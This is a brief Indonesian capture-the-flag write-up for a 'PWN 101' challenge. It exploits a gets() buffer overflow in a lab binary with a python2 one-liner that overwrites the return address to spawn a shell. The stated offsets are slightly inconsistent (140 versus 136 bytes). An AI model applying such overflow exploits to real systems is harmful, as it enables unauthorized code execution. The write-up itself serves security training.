# PWN 101 | Pwn

## Solution
- Terdapat file ELF binary yang menerima input user menggunakan fungsi gets yang vuln buffer overflow
- Nilai buffer adalah 0x90, jadi untuk mengoverwrite nilai v6 yang ada di rsp dubutuhkan sebanyak 140 buffer
- Karena stack harus 16 bit maka kita harus melakukan 2x return ke address
- Exploit
```
(python2 -c 'import struct; print "\x90"*136 + struct.pack("Q", 0x0000000000401190) + struct.pack("Q", 0x0000000000401196)'; cat) | ./bo2
```
- Shell tereksekusi

